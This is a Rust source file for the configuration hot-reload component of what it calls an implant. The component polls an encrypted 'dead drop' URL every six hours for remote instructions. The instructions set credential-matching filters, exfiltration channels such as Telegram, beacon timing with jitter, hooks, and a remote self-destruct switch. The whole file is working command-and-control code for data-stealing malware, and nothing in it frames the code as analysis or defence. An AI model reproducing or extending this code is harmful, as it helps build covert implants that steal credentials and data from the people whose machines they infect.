// Configuration Hot-Reload
// Updates configuration without redeploying implant

use std::sync::Arc;
use tokio::sync::Mutex;
use std::time::Duration;
use anyhow::{Result, Context};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HotReloadConfig {
    pub filters: Vec<FilterConfig>,
    pub exfiltration_channels: Vec<String>,
    pub timing_parameters: TimingConfig,
    pub hooks: Vec<HookConfig>,
    pub self_destruct: bool, // Remote kill switch
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilterConfig {
    pub pattern: String,
    pub data_type: String,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingConfig {
    pub interval_seconds: u64,
    pub jitter: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookConfig {
    pub name: String,
    pub enabled: bool,
}

pub struct ConfigHotReload {
    config: Arc<Mutex<Option<HotReloadConfig>>>,
    dead_drop_url: String,
    check_interval: Duration,
    mission_key: Vec<u8>, // For decrypting config updates
    is_running: Arc<Mutex<bool>>,
}

impl ConfigHotReload {
    pub fn new(dead_drop_url: String, mission_key: Vec<u8>) -> Self {
        Self {
            config: Arc::new(Mutex::new(None)),
            dead_drop_url,
            check_interval: Duration::from_secs(21600), // 6 hours
            mission_key,
            is_running: Arc::new(Mutex::new(false)),
        }
    }
    
    /// Start periodic config check loop
    pub async fn start(&self) -> Result<()> {
        *self.is_running.lock().await = true;
        
        let dead_drop = self.dead_drop_url.clone();
        let mission_key = self.mission_key.clone();
        let config = self.config.clone();
        let is_running = self.is_running.clone();
        let check_interval = self.check_interval;
        
        tokio::spawn(async move {
            loop {
                // Check if still running
                {
                    let running = is_running.lock().await;
                    if !*running {
                        break;
                    }
                }
                
                // Check for config updates
                match Self::check_dead_drop(&dead_drop, &mission_key).await {
                    Ok(Some(new_config)) => {
                        eprintln!("[CONFIG] New configuration received");
                        
                        // Validate configuration
                        if let Err(e) = Self::validate_config(&new_config) {
                            eprintln!("[CONFIG] Invalid configuration: {}", e);
                        } else {
                            // Apply new configuration
                            let mut current = config.lock().await;
                            *current = Some(new_config);
                            eprintln!("[CONFIG] Configuration updated");
                        }
                    }
                    Ok(None) => {
                        // No update available
                    }
                    Err(e) => {
                        eprintln!("[CONFIG] Failed to check dead drop: {}", e);
                    }
                }
                
                // Wait before next check
                tokio::time::sleep(check_interval).await;
            }
        });
        
        Ok(())
    }
    
    async fn check_dead_drop(
        url: &str,
        mission_key: &[u8],
    ) -> Result<Option<HotReloadConfig>> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .build()?;
        
        let response = client
            .get(url)
            .send()
            .await?;
        
        if response.status() == 404 {
            return Ok(None); // No config available
        }
        
        if !response.status().is_success() {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }
        
        let encrypted = response.bytes().await?;
        
        // Decrypt configuration
        use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
        let cipher = Aes256Gcm::new_from_slice(mission_key)
            .context("Failed to create cipher")?;
        
        // Extract nonce (first 12 bytes) and ciphertext
        const NONCE_SIZE: usize = 12; // AES-GCM nonce size
        if encrypted.len() < NONCE_SIZE {
            return Err(anyhow::anyhow!("Encrypted data too short"));
        }
        
        let (nonce_bytes, ciphertext) = encrypted.split_at(NONCE_SIZE);
        let nonce = aes_gcm::aead::generic_array::GenericArray::from_slice(nonce_bytes);
        
        let decrypted = cipher.decrypt(nonce, ciphertext)
            .map_err(|e| anyhow::anyhow!("Failed to decrypt configuration: {:?}", e))?;
        
        // Parse JSON configuration
        let config: HotReloadConfig = serde_json::from_slice(&decrypted)
            .context("Failed to parse configuration")?;
        
        Ok(Some(config))
    }
    
    fn validate_config(config: &HotReloadConfig) -> Result<()> {
        // Validate filters
        for filter in &config.filters {
            if filter.pattern.is_empty() {
                return Err(anyhow::anyhow!("Empty filter pattern"));
            }
            
            // Validate regex
            regex::Regex::new(&filter.pattern)
                .context("Invalid regex pattern")?;
        }
        
        // Validate timing parameters
        if config.timing_parameters.interval_seconds == 0 {
            return Err(anyhow::anyhow!("Invalid interval"));
        }
        
        if config.timing_parameters.jitter < 0.0 || config.timing_parameters.jitter > 1.0 {
            return Err(anyhow::anyhow!("Invalid jitter (must be 0.0-1.0)"));
        }
        
        Ok(())
    }
    
    /// Get current configuration
    pub async fn get_config(&self) -> Option<HotReloadConfig> {
        let config = self.config.lock().await;
        config.clone()
    }
    
    /// Stop config reload loop
    pub async fn stop(&self) {
        *self.is_running.lock().await = false;
    }
    
    /// Check if self-destruct was triggered
    pub async fn should_self_destruct(&self) -> bool {
        let config = self.config.lock().await;
        config.as_ref().map(|c| c.self_destruct).unwrap_or(false)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_config_validation() {
        let config = HotReloadConfig {
            filters: vec![FilterConfig {
                pattern: r"password".to_string(),
                data_type: "CREDENTIAL".to_string(),
                enabled: true,
            }],
            exfiltration_channels: vec!["telegram".to_string()],
            timing_parameters: TimingConfig {
                interval_seconds: 3600,
                jitter: 0.25,
            },
            hooks: vec![],
            self_destruct: false,
        };
        
        assert!(ConfigHotReload::validate_config(&config).is_ok());
    }
}

